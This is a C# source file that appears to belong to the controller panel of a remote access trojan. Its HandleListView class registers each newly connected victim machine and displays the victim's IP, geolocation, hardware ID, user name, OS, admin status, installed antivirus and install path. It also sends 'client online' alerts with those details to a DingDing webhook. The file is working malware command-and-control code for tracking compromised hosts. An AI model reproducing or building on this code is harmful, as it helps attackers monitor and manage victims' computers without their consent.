using System;
using Server.MessagePack;
using Server.Connection;
using cGeoIp;
using System.Drawing;
using System.Windows.Forms;
using System.Threading;
using System.Media;
using Server.Helper;

namespace Server.Handle_Packet
{
    public class HandleListView
    {
        public void AddToListview(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                lock (Settings.LockBlocked)
                {
                    try
                    {
                        if (Settings.Blocked.Count > 0)
                        {
                            if (Settings.Blocked.Contains(unpack_msgpack.ForcePathObject("HWID").AsString))
                            {
                                client.Disconnected();
                                return;
                            }
                            else if (Settings.Blocked.Contains(client.Ip))
                            {
                                client.Disconnected();
                                return;
                            }
                        }
                    }
                    catch { }
                }

                client.LV = new ListViewItem
                {
                    Tag = client,
                    Text = string.Format("{0}:{1}", client.Ip, client.TcpClient.LocalEndPoint.ToString().Split(':')[1]),
                };
                string[] ipinf;
                try
                {
                    ipinf = Program.form1.cGeoMain.GetIpInf(client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]).Split(':');
                    client.LV.SubItems.Add(ipinf[1]);
                    try
                    {
                        client.LV.ImageKey = ipinf[2] + ".png";
                    }
                    catch { }
                }
                catch
                {
                    client.LV.SubItems.Add("??");
                }
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Group").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Version").AsString);
                try
                {
                    client.LV.SubItems.Add(Convert.ToDateTime(unpack_msgpack.ForcePathObject("Install_ed").AsString).ToLocalTime().ToString());
                }
                catch
                {
                    try
                    {
                        client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Install_ed").AsString);
                    }
                    catch
                    {
                        client.LV.SubItems.Add("??");
                    }
                }
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Admin").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Anti_virus").AsString);
                client.LV.SubItems.Add("0000 MS");
                client.LV.SubItems.Add("...");
                client.LV.ToolTipText = "[Path] " + unpack_msgpack.ForcePathObject("Path").AsString + Environment.NewLine;
                client.LV.ToolTipText += "[Paste_bin] " + unpack_msgpack.ForcePathObject("Paste_bin").AsString;
                client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
                client.LV.UseItemStyleForSubItems = false;
                Program.form1.Invoke((MethodInvoker)(() =>
                {
                lock (Settings.LockListviewClients)
                {
                    Program.form1.listView1.Items.Add(client.LV);
                    Program.form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                    Program.form1.lv_act.Width = 500;
                }

                if (Properties.Settings.Default.Notification == true)
                {
                    Program.form1.notifyIcon1.BalloonTipText = $@"Connected 
{client.Ip} : {client.TcpClient.LocalEndPoint.ToString().Split(':')[1]}";
                    Program.form1.notifyIcon1.ShowBalloonTip(100);
                    if (Properties.Settings.Default.DingDing == true && Properties.Settings.Default.WebHook != null && Properties.Settings.Default.Secret != null)
                    {
                        try
                        {
                            string content = $"客户端 {client.Ip} 已上线" + "\n"
                                + "分组:" + unpack_msgpack.ForcePathObject("Group").AsString + "\n"
                                + "用户名:" + unpack_msgpack.ForcePathObject("User").AsString + "\n"
                                    + "系统:" + unpack_msgpack.ForcePathObject("OS").AsString + "\n"
                                    + "权限:" + unpack_msgpack.ForcePathObject("Admin").AsString;
                                DingDing.Send(Properties.Settings.Default.WebHook, Properties.Settings.Default.Secret, content);
                            } 
                            catch (Exception ex) 
                            {
                                MessageBox.Show(ex.Message); 
                            }                            
                        }
                    }

                    new HandleLogs().Addmsg($"客户端 {client.Ip} 已上线", Color.Green);
                    SoundPlayer sp = new SoundPlayer(Server.Properties.Resources.online);
                    sp.Load();
                    sp.Play();
                }));
            }
            catch { }
        }

        public void Received(Clients client)
        {
            try
            {
                lock (Settings.LockListviewClients)
                    if (client.LV != null)
                        client.LV.ForeColor = Color.Empty;
            }
            catch { }
        }
    }
}
